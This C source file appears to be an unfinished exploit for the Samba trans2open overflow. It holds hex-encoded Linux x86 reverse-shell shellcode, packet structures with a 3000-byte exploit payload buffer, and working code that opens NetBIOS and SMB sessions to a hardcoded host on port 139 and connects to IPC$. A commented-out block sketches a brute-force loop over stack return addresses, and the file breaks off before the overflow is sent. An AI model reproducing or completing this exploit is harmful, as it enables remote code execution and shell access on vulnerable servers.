#include <arpa/inet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// structures

#pragma pack(push, p1, 1)

struct NB_HEADER {
  uint8_t type;
  uint8_t flag;
  uint16_t length;
};

struct SMB_HEADER {
  uint8_t proto[4];
  uint8_t command;
  uint32_t stat;
  uint8_t flag;
  uint8_t flag2;
  uint16_t pid_h;
  uint8_t sign[8];
  uint16_t reserved;
  uint16_t pid;
  uint16_t tid;
  uint16_t uid;
  uint16_t mid;
};

struct session_setup_t {
  struct NB_HEADER nb_hdr;
  struct SMB_HEADER smb_hdr;
  uint8_t word_c;
  // Params
  uint8_t andx_command;
  uint8_t andx_reserved;
  uint16_t andx_offset;
  uint16_t max_buffer;
  uint16_t max_mpx;
  uint16_t v_channel;
  uint32_t session_key;
  uint16_t ansi_pass_len;
  uint16_t uni_pass_len;
  uint32_t reserved;
  uint32_t capa;
  //
  uint16_t byte_c;
  uint8_t data_bytes[2];
};

struct tree_connect_t {
  struct NB_HEADER nb_hdr;
  struct SMB_HEADER smb_hdr;
  // params
  uint8_t word_c;
  uint8_t andx_command;
  uint8_t andx_reserved;
  uint16_t andx_offset;
  uint16_t flag;
  uint16_t pw_len;
  // data
  uint16_t byte_c;
  uint8_t data[25];
};

struct trans2open_t {
  struct NB_HEADER nb_hdr;
  struct SMB_HEADER smb_hdr;
  uint8_t word_c;
  // Params
  uint16_t total_param_count;
  uint16_t total_data_count;
  uint16_t max_param_count;
  uint16_t max_data_count;
  uint8_t max_setup_count;
  uint8_t pad;
  uint16_t flag;
  uint32_t timeout;
  uint16_t reserved;
  uint16_t parameter_count;
  uint16_t parameter_offset;
  uint16_t data_count;
  uint16_t data_offset;
  uint8_t setup_count;
  uint8_t pad2;
  uint16_t setup_word;
  //
  uint16_t byte_c;
  uint8_t data_bytes[2];
  uint8_t exploit_data[3000];
};

#pragma pack(pop, p1)

// decloration

const uint8_t linux_x86_revshell[] =
    "\xbd\x61\x1d\xa2\xa4\xda\xc1\xd9\x74\x24\xf4\x58\x29\xc9"
    "\xb1\x12\x31\x68\x12\x03\x68\x12\x83\x89\xe1\x40\x51\x78"
    "\xc1\x72\x79\x29\xb6\x2f\x14\xcf\xb1\x31\x58\xa9\x0c\x31"
    "\x0a\x6c\x3f\x0d\xe0\x0e\x76\x0b\x03\x66\x49\x43\xf2\x70"
    "\x21\x96\xf5\x6d\xed\x1f\x14\x3d\x6b\x70\x86\x6e\xc7\x73"
    "\xa1\x71\xea\xf4\xe3\x19\x9b\xdb\x70\xb1\x0b\x0b\x58\x23"
    "\xa5\xda\x45\xf1\x66\x54\x68\x45\x83\xab\xeb";

const uint8_t smb_sample[] = {
    0xff, 'S',  'M',
    'B',  // proto
    0x00, // command
    0x00, 0x00, 0x00,
    0x00, // status
    0x08, // flag
    0x01,
    0x00, // flag2
    0x00,
    0x00, // PID High
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, // sign
    0x00,
    0x00, // reserved
    0x00,
    0x00, // pid
    0x01,
    0x00, // tid
    0x64,
    0x00, // uid
    0x00,
    0x00 // mid
};

int getsock();
int start_session(int sock);

// realization

int getsock() {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    return -1;
  };

  struct sockaddr_in sa;
  sa.sin_family = AF_INET;
  sa.sin_port = htons(139);

  inet_pton(AF_INET, "192.168.1.104", &sa.sin_addr);

  memset(sa.sin_zero, 0, 8);

  if (connect(sock, (struct sockaddr *)&sa, sizeof(struct sockaddr)) < 0) {
    return -1;
  };

  return sock;
};

int start_session(int sock) {

  uint8_t buffer[1000] = {0};
  uint8_t recv_buffer[1000] = {0};

  // Nbios session setup
  struct NB_HEADER *nb_hdr = (struct NB_HEADER *)buffer;

  nb_hdr->type = 0x81;
  nb_hdr->length = htons(68);

  *(buffer + 4) = 0x20;
  memcpy(buffer + 5, "CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 32);

  *(buffer + 38) = 0x20;
  memcpy(buffer + 39, "EFELEEEAEAEAEAEAEAEAEAEAEAEAEAEA", 32);

  if (send(sock, buffer, 72, 0) <= 0) {
    return -1;
  };

  if (recv(sock, recv_buffer, 1000, 0) <= 0) {
    return -1;
  };

  if (!(*(recv_buffer) == 0x81 && *(recv_buffer + 1) == 0)) {
    return -1;
  };

  memset(buffer, 0, 1000);
  memset(recv_buffer, 0, 1000);

  // smb session setup
  struct session_setup_t *session_setup = (struct session_setup_t *)buffer;

  session_setup->nb_hdr.length = htons(63);

  memcpy(&session_setup->smb_hdr, smb_sample, 32);
  session_setup->smb_hdr.command = 0x73;

  session_setup->word_c = 0x0d;

  session_setup->andx_command = 0xff;
  session_setup->max_buffer = 0xffff;
  session_setup->max_mpx = htole16(1);

  if (send(sock, buffer, 67, 0) <= 0) {
    return -1;
  };

  if (recv(sock, recv_buffer, 1000, 0) <= 0) {
    return -1;
  }

  if (!(*(recv_buffer + 8) == 0x73 && *(uint32_t *)(recv_buffer + 9) == 0)) {
    return -1;
  };

  uint16_t uid = ((struct SMB_HEADER *)(recv_buffer + 4))->uid;

  memset(buffer, 0, 1000);
  memset(recv_buffer, 0, 1000);

  // smb tree connect
  struct tree_connect_t *tree_conn = (struct tree_connect_t *)buffer;

  tree_conn->nb_hdr.length = htons(68);

  memcpy(&tree_conn->smb_hdr, smb_sample, 32);
  tree_conn->smb_hdr.command = 0x75;
  tree_conn->smb_hdr.uid = uid;

  tree_conn->word_c = 0x04;
  tree_conn->andx_command = 0xff;

  memcpy(tree_conn->data, "\\\\192.168.1.104\\IPC$\x00", 21);
  memcpy(tree_conn->data + 21, "IPC\x00", 4);

  if (send(sock, buffer, sizeof(struct tree_connect_t), 0) <= 0) {
    return -1;
  }

  if (recv(sock, recv_buffer, 1000, 0) <= 0) {
    return -1;
  }

  if (!(*(recv_buffer + 8) == 0x75 && *(uint32_t *)(recv_buffer + 9) == 0)) {
    return -1;
  };

  uint16_t tid = ((struct SMB_HEADER *)(recv_buffer + 4))->tid;

  memset(buffer, 0, 1000);
  memset(recv_buffer, 0, 1000);

  return 0;
};

int main() {
  /*
  u_long start_addr = 0xbffff300;
  u_long end_addr = 0xbffffff0;
  u_long step = 0x100;

  for (u_long current_addr = start_addr; current_addr <= end_addr;
       current_addr += step) {
    // probe logic
  };
  */

  int sock = getsock();

  if (start_session(sock) < 0) {
    return -1;
  };

  return 0;
}
